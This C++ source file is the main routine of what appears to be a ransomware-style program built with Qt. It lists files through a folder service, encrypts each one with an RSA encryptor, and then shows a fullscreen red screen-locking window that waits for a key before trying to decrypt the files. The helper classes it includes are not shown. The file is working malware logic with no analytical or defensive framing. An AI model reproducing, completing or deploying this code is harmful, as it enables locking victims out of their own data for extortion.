#include <QApplication>
#include <iostream>
#include "service/rsaencryptor.h"
#include "view/screenblocker.h"
#include "service/Folderservice.h"

using namespace boost::filesystem;

int main(int argc, char *argv[])
{
    QApplication a(argc, argv);
    std::string key = "";

    FolderService folderservice;

    std::vector<std::string> files = folderservice.list_files();

    RSAEncryptor* encryptor = new RSAEncryptor();

    for (std::string filePath : files) {
        try {
            encryptor->encryptFile(filePath);
        } catch(Exception ex) {
            std::cout << ex.what()<<std::endl;
        }
    }


    ScreenBlocker* screenBlocker = new ScreenBlocker();
    // Set the main window
    screenBlocker->setWindowTitle("My Window");
    screenBlocker->setStyleSheet("background-color: red;");
    // Show the window in fullscreen
    screenBlocker->showFullScreen();
    screenBlocker->show();
    a.exec();

    QString Qkey = screenBlocker->getKey();

    if(Qkey != nullptr) {
        key = Qkey.toStdString();
    }
    std::cout<<key<<std::endl;

    for (std::string filePath : files) {
        try {
            encryptor->decryptFile(filePath, key);
        } catch(Exception ex) {
            std::cout << ex.what()<<std::endl;
        }
    }

    delete encryptor;
    return 0;
}
